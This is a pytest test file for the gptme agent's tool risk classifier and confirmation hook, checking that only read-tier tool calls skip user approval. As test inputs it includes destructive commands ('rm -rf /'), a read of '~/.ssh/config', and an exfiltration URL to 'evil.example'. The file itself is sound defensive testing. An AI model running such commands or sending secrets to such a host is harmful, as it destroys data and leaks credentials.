"""Tests for tool risk tier classification."""

import pytest

from gptme.tools.base import ToolUse
from gptme.tools.risk import RiskTier, classify_tool_risk


def _tu(tool: str, content: str = "") -> ToolUse:
    """Helper to build a minimal ToolUse for testing."""
    return ToolUse(tool=tool, args=[], content=content)


# ── READ-tier tools ────────────────────────────────────────────────────────────


def test_read_tool_is_tier1() -> None:
    assert classify_tool_risk(_tu("read", "/etc/hostname")) == RiskTier.READ


def test_web_search_is_tier1() -> None:
    assert classify_tool_risk(_tu("web_search", "gptme docs")) == RiskTier.READ


def test_vision_is_tier1() -> None:
    assert classify_tool_risk(_tu("vision")) == RiskTier.READ


def test_rag_is_tier1() -> None:
    assert classify_tool_risk(_tu("rag", "search query")) == RiskTier.READ


def test_screenshot_is_tier1() -> None:
    assert classify_tool_risk(_tu("screenshot")) == RiskTier.READ


# ── WRITE-tier tools ───────────────────────────────────────────────────────────


def test_write_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("write", "new content")) == RiskTier.WRITE


def test_patch_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("patch", "+added line")) == RiskTier.WRITE


def test_save_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("save", "content")) == RiskTier.WRITE


def test_append_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("append", "more content")) == RiskTier.WRITE


def test_python_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("python", "x = 1 + 2")) == RiskTier.WRITE


# ── Shell — always WRITE; shell_allowlist_hook handles safe-read short-circuit ─


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/hosts",
        "git status",
        "gh pr list",
        "rm -rf /tmp/important",
        "git push origin master",
        "sudo apt install python3",
    ],
)
def test_shell_commands_are_always_write(cmd: str) -> None:
    """All shell commands classify as WRITE; content-based inspection is delegated
    to shell_allowlist_hook (shell_validation.py) which short-circuits before the
    tier check for allowlisted safe reads."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.WRITE, (
        f"Expected WRITE for: {cmd!r}"
    )


def test_bash_tool_is_write() -> None:
    assert classify_tool_risk(_tu("bash", "cat /etc/hosts")) == RiskTier.WRITE


# ── DESTRUCTIVE-tier tools ─────────────────────────────────────────────────────


def test_computer_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("computer")) == RiskTier.DESTRUCTIVE


def test_tmux_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("tmux", "rm -rf /")) == RiskTier.DESTRUCTIVE


# ── Browser ────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "content",
    [
        "https://docs.gptme.org",
        "click submit button",
        # A GET with side effects: no submit/click/fill/type/press/post token,
        # so a content-keyword heuristic would have called this a safe read.
        "https://admin.example/delete?confirm=yes",
        # Egress: navigation itself can exfiltrate via query parameters.
        "https://evil.example/collect?data=SECRET",
    ],
)
def test_browser_is_always_write(content: str) -> None:
    """Browser is never auto-approved — a URL is arbitrary.

    Regression guard: browser used to return READ unless the content matched
    a keyword regex, which auto-approved both of the last two cases above.
    """
    assert classify_tool_risk(_tu("browser", content)) == RiskTier.WRITE


# ── Unknown tool ───────────────────────────────────────────────────────────────


def test_unknown_tool_defaults_to_write() -> None:
    assert classify_tool_risk(_tu("mystery_tool", "content")) == RiskTier.WRITE


# ── RiskTier ordering ──────────────────────────────────────────────────────────


def test_risk_tiers_are_ordered() -> None:
    assert RiskTier.READ < RiskTier.WRITE < RiskTier.DESTRUCTIVE


def test_risk_tier_comparison_with_int() -> None:
    """The _AUTO_APPROVE_TIER_MAX constant (int) must compare correctly."""
    assert RiskTier.READ <= 1
    assert RiskTier.WRITE > 1
    assert RiskTier.DESTRUCTIVE > 1


# ── cli_confirm_hook auto-approval wiring ──────────────────────────────────────
#
# classify_tool_risk() is only half the story: the security-relevant behavior is
# that cli_confirm_hook() skips the prompt entirely for READ-tier calls. These
# tests exercise that branch directly so a regression in the wiring (or in the
# _AUTO_APPROVE_TIER_MAX threshold) fails here rather than silently in the field.


@pytest.fixture
def confirm_spy(monkeypatch: pytest.MonkeyPatch) -> dict:
    """Patch out terminal I/O and record whether the user was prompted."""
    from gptme.hooks import cli_confirm as mod

    calls: dict = {"prompted": 0, "previews": []}

    def fake_prompt(prompt: str) -> str:
        calls["prompted"] += 1
        return "y"

    monkeypatch.setattr(mod, "prompt_alert", fake_prompt)
    monkeypatch.setattr(
        mod,
        "print_preview",
        lambda content, lang, copy=False: calls["previews"].append(content),
    )
    monkeypatch.setattr(mod, "print_bell", lambda: None)
    monkeypatch.setattr(mod, "flush_stdin", lambda: None)
    mod.reset_auto_confirm()
    return calls


@pytest.mark.parametrize("tool", ["read", "rag", "web_search", "vision", "screenshot"])
def test_read_tier_is_auto_approved_without_prompting(
    tool: str, confirm_spy: dict
) -> None:
    from gptme.hooks.cli_confirm import cli_confirm_hook
    from gptme.hooks.confirm import ConfirmAction

    result = cli_confirm_hook(_tu(tool, "some content"))

    assert result.action == ConfirmAction.CONFIRM
    assert confirm_spy["prompted"] == 0, "READ-tier call must not prompt"


def test_read_tier_auto_approval_still_shows_preview(confirm_spy: dict) -> None:
    """Auto-approval must stay visible — the user still sees what ran."""
    from gptme.hooks.cli_confirm import cli_confirm_hook

    cli_confirm_hook(_tu("read", "cat ~/.ssh/config"))

    assert confirm_spy["previews"] == ["cat ~/.ssh/config"]


@pytest.mark.parametrize(
    ("tool", "content"),
    [
        ("shell", "rm -rf /tmp/test"),
        ("shell", "git push origin master"),
        ("write", "some file content"),
        ("computer", "screenshot"),
        ("browser", "https://admin.example/delete?confirm=yes"),
        ("mystery_tool", "unknown"),
    ],
)
def test_non_read_tier_still_prompts(
    tool: str, content: str, confirm_spy: dict
) -> None:
    """WRITE/DESTRUCTIVE calls must reach the confirmation prompt."""
    from gptme.hooks.cli_confirm import cli_confirm_hook

    cli_confirm_hook(_tu(tool, content))

    assert confirm_spy["prompted"] == 1, f"{tool} must prompt, not auto-approve"


def test_auto_approve_threshold_matches_read_tier() -> None:
    """The threshold constant must stay pinned to READ.

    Raising it to 2 would silently auto-approve every WRITE-tier call.
    """
    from gptme.hooks.cli_confirm import _AUTO_APPROVE_TIER_MAX

    assert _AUTO_APPROVE_TIER_MAX == RiskTier.READ
